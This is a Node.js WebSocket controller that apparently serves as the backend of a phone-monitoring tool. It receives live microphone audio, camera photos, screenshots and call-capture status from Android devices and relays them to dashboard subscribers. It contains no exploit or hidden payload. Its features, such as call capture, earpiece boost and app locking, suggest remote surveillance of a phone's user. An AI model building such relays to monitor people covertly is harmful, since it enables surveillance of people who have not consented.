/**
 * Device WebSocket controller (/audio/<deviceId>)
 */

const WebSocket = require("ws");
const { parseReqUrl } = require("../utils/url");
const { normalizeDeviceId } = require("../utils/device");
const deviceStore = require("../models/deviceStore");
const dashboardStore = require("../models/dashboardStore");
const { broadcastToDashboard, broadcastToDeviceSubscribers, safeSend } = require("../services/dashboardService");
const { parseAudioPayload, buildAmplifiedPayload } = require("../utils/audio");
const { saveUploadedPhoto } = require("../services/photoService");

const { DASHBOARD_MAX_BUFFERED_BYTES } = require("../config");

function compactHealthSignature(health = {}) {
  return [
    health.wsConnected,
    health.dashboardConnected,
    health.micCapturing,
    health.cameraCapturing,
    health.reason,
    health.streamCodec,
    health.codec,
    health.streamCodecMode,
    health.voiceProfile,
    health.cleanFarVoice,
    health.callCaptureMode,
    health.earpieceBoost,
    health.callAecMode,
    health.agcMode,
    health.internetOnline,
    health.callActive,
    health.batteryPct,
    health.charging,
    health.lowNetwork,
    health.lowNetworkRequested,
    health.networkLagging,
    health.droppingPackets,
    health.noiseGateActive,
    health.wsBufferedBytes,
    health.audioFramesSent,
    health.audioFramesDropped,
    health.imageUploadStatus,
    health.imageQueued,
    health.imageUploading,
    health.uploadPausedForAudio,
    health.imageQueueDepth,
    health.audioDrops,
    health.silenceDrops,
    health.frameMs,
    health.photoQuality,
    health.photoNight,
    health.netType,
    health.networkLocked,
    health.appLocked,
    health.gainLevel,
  ].join("|");
}

function handleAudioDevice(ws, req) {
  const { pathname } = parseReqUrl(req.url || "");
  const parts = pathname.split("/");
  const rawDeviceId = parts[2] || "unknown_" + Date.now();
  const deviceId = normalizeDeviceId(decodeURIComponent(rawDeviceId));

  console.log(`📱 Device connected: "${deviceId}" (raw: "${rawDeviceId}")`);
  console.log(
    `📋 Current devices before: [${Array.from(deviceStore.devices.keys())
      .map((k) => `"${k}"`)
      .join(", ")}]`,
  );

  const existing = deviceStore.getDevice(deviceId);
  if (existing && existing.ws && existing.ws !== ws) {
    console.log(`♻️ Replacing existing socket for ${deviceId}`);
    try {
      existing.ws.terminate();
    } catch (_) {}
  }

  const deviceData = {
    ws,
    model: "Unknown",
    sdk: 0,
    appVersionName: "",
    appVersionCode: 0,
    connectedAt: new Date(),
    health: {
      wsConnected: true,
      dashboardConnected: true,
      micCapturing: false,
      cameraCapturing: false,
      lastAudioChunkAt: Date.now(),
      lastHealthAt: Date.now(),
      reason: "connected",
      internetOnline: true,
      callActive: false,
      batteryPct: null,
      charging: null,
      networkLocked: false,
      appLocked: false,
      imageUploadStatus: "idle",
      imageQueued: false,
      imageUploading: false,
      uploadPausedForAudio: false,
      imageQueueDepth: 0,
      gainLevel: 1.0,
    },
  };

  // Mark device sockets so the generic WS heartbeat does not kill active audio streams.
  ws._isAudioDevice = true;

  deviceStore.addDevice(deviceId, deviceData);

  broadcastToDashboard({
    type: "device_connected",
    deviceId,
    model: "Unknown",
    health: deviceStore.getDevice(deviceId)?.health,
  });

  ws.on("message", (data) => {
    const current = deviceStore.getDevice(deviceId);
    if (!current || current.ws !== ws) {
      return;
    }

    const isText =
      typeof data === "string" ||
      (data instanceof Buffer &&
        (data.slice(0, 12).toString().startsWith("DEVICE_INFO:") ||
          data.slice(0, 4).toString().startsWith("ACK:") ||
          data.slice(0, 5).toString().startsWith("FILE:") ||
          data.slice(0, 5).toString().startsWith("pong:") ||
          data.slice(0, 1).toString() === "{"));

    if (isText) {
      const text = data.toString().trim();

      if (text.startsWith("DEVICE_INFO:")) {
        const infoParts = text.split(":");
        const model = infoParts[2];
        const sdk = infoParts[3];
        const appVersionName = infoParts[4] || "";
        const appVersionCode = Number(infoParts[5] || 0) || 0;
        const dev = deviceStore.getDevice(deviceId);
        if (dev) {
          dev.model = model;
          dev.sdk = parseInt(sdk, 10) || 0;
          if (appVersionName) dev.appVersionName = appVersionName;
          if (appVersionCode > 0) dev.appVersionCode = appVersionCode;
        }
        console.log(`ℹ️ [Device] ${deviceId} identified: ${model} (SDK ${sdk}, v${appVersionName})`);
        broadcastToDashboard({
          type: "device_info",
          deviceId,
          model,
          sdk,
          appVersionName,
          appVersionCode,
        });
      } else if (text.startsWith("ACK:")) {
        console.log(`✅ ACK from ${deviceId}: ${text}`);
        broadcastToDashboard({ type: "ack", deviceId, message: text });
      } else if (text.startsWith("FILE:")) {
        console.log(`Ignoring FILE message from ${deviceId}; audio recording is disabled`);
      } else if (text === `pong:${deviceId}`) {
        // heartbeat pong — ignore
      } else if (text.startsWith("{")) {
        try {
          const json = JSON.parse(text);
          if (json.type === "device_data") {
            console.log(`📊 device_data from ${deviceId}`);
            broadcastToDashboard({
              type: "device_data",
              deviceId,
              data: json.data,
            });
          } else if (json.type === "health_status") {
            const dev = deviceStore.getDevice(deviceId);
            if (dev) {
              dev.health = {
                wsConnected: json.wsConnected !== false,
                dashboardConnected: json.dashboardConnected !== false && json.wsConnected !== false,
                micCapturing: json.micCapturing === true,
                cameraCapturing: json.cameraCapturing === true,
                lastAudioChunkAt: Number(
                  json.lastAudioChunkSentAt || dev.health?.lastAudioChunkAt || 0,
                ),
                lastHealthAt: Number(json.ts || Date.now()),
                reason: String(json.reason || "heartbeat"),
                aiMode: json.aiMode !== false,
                aiAuto: json.aiAuto !== false,
                streamCodec: String(json.streamCodec || dev.health?.streamCodec || "pcm"),
                codec: String(json.codec || json.streamCodec || dev.health?.codec || "pcm16"),
                streamCodecMode: String(
                  json.streamCodecMode || dev.health?.streamCodecMode || "auto",
                ),
                voiceProfile: String(json.voiceProfile || dev.health?.voiceProfile || "near"),
                cleanFarVoice: json.cleanFarVoice === true,
                callCaptureMode: String(json.callCaptureMode || dev.health?.callCaptureMode || "mic"),
                earpieceBoost: String(json.earpieceBoost || dev.health?.earpieceBoost || "off"),
                callAecMode: String(json.callAecMode || dev.health?.callAecMode || "auto"),
                agcMode: String(json.agcMode || dev.health?.agcMode || "auto"),
                noiseDb: Number.isFinite(Number(json.noiseDb)) ? Number(json.noiseDb) : null,
                internetOnline: json.internetOnline !== false,
                callActive: json.callActive === true,
                batteryPct: Number.isFinite(Number(json.batteryPct)) ? Number(json.batteryPct) : null,
                charging: typeof json.charging === "boolean" ? json.charging : null,
                lowNetwork: json.lowNetwork === true,
                lowNetworkRequested: json.lowNetworkRequested === true,
                networkLagging: json.networkLagging === true,
                droppingPackets: json.droppingPackets === true,
                noiseGateActive: json.noiseGateActive === true,
                wsBufferedBytes: Number(json.wsBufferedBytes || 0),
                audioFramesSent: Number(json.audioFramesSent || dev.health?.audioFramesSent || 0),
                audioFramesDropped: Number(json.audioFramesDropped || dev.health?.audioFramesDropped || 0),
                imageUploadStatus: String(json.imageUploadStatus || dev.health?.imageUploadStatus || "idle"),
                imageQueued: json.imageQueued === true,
                imageUploading: json.imageUploading === true,
                uploadPausedForAudio: json.uploadPausedForAudio === true,
                imageQueueDepth: Number(json.imageQueueDepth || 0),
                audioDrops: Number(json.audioDrops || dev.health?.audioDrops || 0),
                silenceDrops: Number(json.silenceDrops || dev.health?.silenceDrops || 0),
                silenceFramesDropped: Number(json.silenceFramesDropped || json.silenceDrops || dev.health?.silenceFramesDropped || 0),
                frameMs: Number(json.frameMs || dev.health?.frameMs || 20),
                photoAi: json.photoAi !== false,
                photoQuality: String(json.photoQuality || dev.health?.photoQuality || "normal"),
                photoNight: String(json.photoNight || dev.health?.photoNight || "off"),
                appVersionName: String(json.appVersionName || dev.health?.appVersionName || ""),
                appVersionCode: Number.isFinite(Number(json.appVersionCode))
                  ? Number(json.appVersionCode)
                  : Number(dev.health?.appVersionCode || 0),
                netDownKbps: Number(json.netDownKbps || 0),
                netUpKbps: Number(json.netUpKbps || 0),
                netType: String(json.netType || "other"),
                networkLocked: json.networkLocked === true,
                appLocked: json.appLocked === true,
                gainLevel: Number.isFinite(Number(json.gainLevel)) ? Number(json.gainLevel) : 1.0,
              };
            }
            if (dev?.health) {
              const now = Date.now();
              const signature = compactHealthSignature(dev.health);
              const shouldBroadcast =
                signature !== dev._lastHealthSignature ||
                !dev._lastHealthBroadcastAt ||
                now - dev._lastHealthBroadcastAt > 5000;
              if (shouldBroadcast) {
                dev._lastHealthSignature = signature;
                dev._lastHealthBroadcastAt = now;
                broadcastToDashboard({
                  type: "device_health",
                  deviceId,
                  health: dev.health,
                });
              }
            }
          } else if (json.type === "image_upload_status") {
            const dev = deviceStore.getDevice(deviceId);
            if (dev) {
              dev.health = {
                ...(dev.health || {}),
                imageUploadStatus: String(json.status || "idle"),
                imageQueued: json.imageQueued === true,
                imageUploading: json.uploading === true,
                uploadPausedForAudio: json.uploadPausedForAudio === true,
                imageQueueDepth: Number(json.queueDepth || 0),
                lowNetwork: json.audioLive === true ? true : dev.health?.lowNetwork === true,
              };
            }
            broadcastToDashboard({
              type: "image_upload_status",
              deviceId,
              status: String(json.status || "idle"),
              command: String(json.command || ""),
              filename: String(json.filename || ""),
              audioLive: json.audioLive === true,
              imageQueued: json.imageQueued === true,
              uploadPausedForAudio: json.uploadPausedForAudio === true,
              uploading: json.uploading === true,
              uploaded: json.uploaded === true,
              queueDepth: Number(json.queueDepth || 0),
              ts: Number(json.ts || Date.now()),
            });
          } else if (json.type === "photo_upload" || json.type === "screenshot_upload") {
            const saved = saveUploadedPhoto(deviceId, json);
            if (saved) {
              broadcastToDashboard({
                type: "photo_saved",
                deviceId,
                filename: saved.filename,
                url: `/photos/${saved.filename}`,
                size: saved.size,
                camera: saved.camera,
                quality: saved.quality,
                nightMode: saved.nightMode,
                aiEnhanced: saved.aiEnhanced,
                ts: saved.ts,
              });
            }
          } else if (json.type === "fcm_token") {
            const dev = deviceStore.getDevice(deviceId);
            if (dev) {
              dev.fcmToken = String(json.token || "");
              console.log(`🔑 Registered FCM Token for ${deviceId}: ${dev.fcmToken.substring(0, 20)}...`);
            }
          } else if (json.type === "command_ack") {
            console.log(`✅ [ACK] ${deviceId} command result: ${json.command} = ${json.status} (${json.detail || "no detail"})`);
            broadcastToDeviceSubscribers(deviceId, {
              type: "command_ack",
              deviceId,
              command: String(json.command || ""),
              status: String(json.status || "success"),
              detail: String(json.detail || ""),
              ts: Number(json.ts || Date.now()),
            });
          } else if (json.type === "update_status" || json.type === "update_available") {
            console.log(`🔄 Update status from ${deviceId}: ${json.status || json.version || "?"}`);
            broadcastToDeviceSubscribers(deviceId, { ...json, deviceId });
          } else if (json.type === "error") {
            console.error(`⚠️  Error from ${deviceId}: ${json.message}`);
            broadcastToDeviceSubscribers(deviceId, {
              type: "error",
              message: `[${deviceId.substring(0, 8)}] ${json.message}`,
            });
          } else {
            console.log(`📨 ${deviceId}: ${text}`);
          }
        } catch (_) {
          console.log(`📨 ${deviceId}: ${text}`);
        }
      } else {
        console.log(`📨 ${deviceId}: ${text}`);
      }
      return;
    }

    const dev = deviceStore.getDevice(deviceId);
    const buf = Buffer.from(data);

    // Keep binary diagnostics lightweight; per-frame logs add latency on weak hosts.
    // ── Binary Camera Live Frame Routing ────────────────────────────────────
    if (buf.length >= 4 && buf[0] === 0x43 && buf[1] === 0x4C) { // 'C', 'L'
      const headerLen = (buf[2] << 8) | buf[3];
      if (headerLen > 0 && buf.length >= 4 + headerLen) {
        const headerJson = buf.subarray(4, 4 + headerLen).toString("utf8");
        const jpegBytes = buf.subarray(4 + headerLen);
        try {
          const header = JSON.parse(headerJson);
          if ((header?.type === "photo_upload" || header?.type === "screenshot_upload") && jpegBytes.length > 0) {
            const saved = saveUploadedPhoto(deviceId, {
              ...header,
              data: jpegBytes.toString("base64"),
            });
            if (saved) {
              broadcastToDashboard({
                type: "photo_saved",
                deviceId,
                filename: saved.filename,
                url: `/photos/${saved.filename}`,
                size: saved.size,
                camera: saved.camera,
                quality: saved.quality,
                nightMode: saved.nightMode,
                aiEnhanced: saved.aiEnhanced,
                ts: saved.ts,
              });
            }
            return;
          }
        } catch (_e) {}
      }
      return; // Photo/screenshot frames are not audio.
    }
    let hasDashboardSubscribers = false;
    dashboardStore.forEachClientSubscribedToDevice(deviceId, () => {
      hasDashboardSubscribers = true;
    });

    if (dev?.health) {
      dev.health.lastAudioChunkAt = Date.now();
      dev.health.micCapturing = true;
      dev.health.wsConnected = true;
      dev.health.dashboardConnected = true;
    }

    // If nobody is listening, skip audio processing/routing.
    if (!hasDashboardSubscribers) {
      return;
    }

    // SENIOR DEV FIX: Let the Android device handle the DSP. 
    // The backend must act as a clean passthrough to preserve the SNR.
    const serverGain = 1.0; 
    const needsDecodedAudio = false;
    let parsedAudio = null;
    let forwardedPayload = buf;

    if (needsDecodedAudio) {
      try {
        parsedAudio = parseAudioPayload(buf);
      } catch (e) {
        console.error(`⚠️  Failed to parse audio from ${deviceId}:`, e.message);
        return;
      }
    }

    const now = Date.now();
    if (!dev._lastAudioLogAt || now - dev._lastAudioLogAt > 30000) {
      dev._lastAudioLogAt = now;
      console.log(
        `🎵 [Audio] from ${deviceId}: ${data.length} bytes${parsedAudio ? `, HQ=${parsedAudio.isHqMode}` : ""}`,
      );
    }
    // S-M2 fix: Throttle device_info/health broadcasts to every 30s (was 5s)
    if (!dev._lastInfoBroadcastAt || now - dev._lastInfoBroadcastAt > 30_000) {
      dev._lastInfoBroadcastAt = now;
      broadcastToDeviceSubscribers(deviceId, {
        type: "device_info",
        deviceId,
        model: dev.model || "Unknown",
        sdk: dev.sdk || 0,
        appVersionName: dev.appVersionName || "",
        appVersionCode: dev.appVersionCode || 0,
      });
      broadcastToDeviceSubscribers(deviceId, {
        type: "device_health",
        deviceId,
        health: dev.health || null,
      });
    }

    // S-H1 Fix: Default server gain remains 1.0 (no-op). Avoid decode/re-encode when no gain is needed.
    if (parsedAudio) {
      forwardedPayload = buildAmplifiedPayload(
        parsedAudio.forwardPayload,
        parsedAudio.pcm16,
        serverGain,
        true, // has 4-byte audio header
      );
    }

    const idBuf = Buffer.from(deviceId, "utf8");
    const header = Buffer.alloc(2);
    header.writeUInt16BE(idBuf.length, 0);
    const audioFrame = Buffer.concat([header, idBuf, forwardedPayload]);
    // Route audio only to dashboard clients that actively subscribed to this deviceId.
    dashboardStore.forEachClientSubscribedToDevice(deviceId, (client) => {
      if (client.readyState !== WebSocket.OPEN) return;
      const buffered = client.bufferedAmount || 0;
      const now = Date.now();
      if (buffered > DASHBOARD_MAX_BUFFERED_BYTES) {
        client._droppedFrames = (client._droppedFrames || 0) + 1;
        if (!client._lastDropNotifyAt || now - client._lastDropNotifyAt > 2_000) {
          client._lastDropNotifyAt = now;
          try {
            safeSend(
              client,
              JSON.stringify({
                type: "audio_quality",
                deviceId,
                droppedFrames: client._droppedFrames,
                buffered: client.bufferedAmount,
                lowNetwork: true,
                dropping: true,
                ts: now,
              }),
            );
            client._droppedFrames = 0;
          } catch (_e) {}
        }
        return;
      }

      safeSend(client, audioFrame, DASHBOARD_MAX_BUFFERED_BYTES);
    });


  });

  ws.on("close", () => {
    const current = deviceStore.getDevice(deviceId);
    if (!current || current.ws !== ws) {
      console.log(`↪️ Ignoring stale close for "${deviceId}"`);
      return;
    }

    console.log(`❌ Device disconnected: "${deviceId}"`);
    console.log(
      `📋 Devices before removal: [${Array.from(deviceStore.devices.keys())
        .map((k) => `"${k}"`)
        .join(", ")}]`,
    );

    deviceStore.removeDevice(deviceId);

    console.log(
      `📋 Devices after removal: [${Array.from(deviceStore.devices.keys())
        .map((k) => `"${k}"`)
        .join(", ")}]`,
    );
    broadcastToDashboard({ type: "device_disconnected", deviceId });
  });

  ws.on("error", (err) => {
    console.error(`⚠️  Error from ${deviceId}:`, err.message);
  });
}

module.exports = {
  handleAudioDevice,
};
